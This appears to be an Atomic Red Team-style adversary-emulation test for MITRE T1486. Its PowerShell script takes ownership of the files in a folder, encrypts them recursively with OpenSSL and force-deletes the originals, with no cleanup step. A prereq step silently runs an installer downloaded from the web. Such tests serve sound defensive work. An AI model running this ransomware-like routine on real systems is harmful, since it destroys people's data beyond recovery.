attack_technique: T1486
 display_name: Data Encrypted for Impact (Destructive Version)
 atomic_tests:
 - name: Encrypt and delete files recursively in a test folder
   auto_generated_guid: custom-guid-1234567890abcdef
   description: |
     This test encrypts all files in a test folder using a strong password and then deletes the original files.
     WARNING: THIS IS A DESTRUCTIVE ACTION AND SHOULD ONLY BE RUN IN A CONTROLLED ENVIRONMENT.
   supported_platforms:
   - windows
   input_arguments:
     encryption_password:
       description: Password to use for encryption
       type: string
       default: ChaymaOumayma2025
     target_directory:
       description: Directory to encrypt and delete files from
       type: path
       default: C:\test_files\
   dependency_executor_name: powershell
   dependencies:
   - description: |
       Checks if openssl is installed
     prereq_command: |
       if (Get-Command openssl -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
     get_prereq_command: |
       Write-Host "Installing OpenSSL..."
       Invoke-WebRequest "https://slproweb.com/download/Win64OpenSSL_Light-3_2_1.exe" -OutFile "$env:TEMP\openssl-installer.exe"
       Start-Process "$env:TEMP\openssl-installer.exe" -ArgumentList "/S" -Wait
   executor:
     name: powershell
     elevation_required: true
     command: |
       $password = "#{encryption_password}"
       $targetDir = "#{target_directory}"
       
       # Vérifier si le répertoire cible existe
       if (-Not (Test-Path $targetDir)) {
           Write-Host "Le répertoire cible $targetDir n'existe pas."
           exit 1
       }
 
       Write-Host "Encrypting files in $targetDir recursively..."
 
       # Prendre possession et modifier les permissions des fichiers
       Get-ChildItem -Path $targetDir -Recurse -File | ForEach-Object {
           $file = $_.FullName
 
           # Prendre possession du fichier
           takeown /F $file /A
           icacls $file /grant Administrators:F /T /C
 
           # Chiffrer le fichier avec OpenSSL
           $encryptedFile = "$file.enc"
           openssl enc -aes-256-cbc -salt -pbkdf2 -iter 10000 -in $file -out $encryptedFile -pass pass:$password
           
           if ($LASTEXITCODE -eq 0) {
               Write-Host "Encrypted: $file -> $encryptedFile"
               
               # Supprimer le fichier original après chiffrement réussi
               Remove-Item -Path $file -Force
               Write-Host "Deleted: $file"
           } else {
               Write-Host "Failed to encrypt: $file"
           }
       }
 
       Write-Host "Encryption and deletion process completed."
     cleanup_command: |
       Write-Host "No cleanup performed for destructive actions."
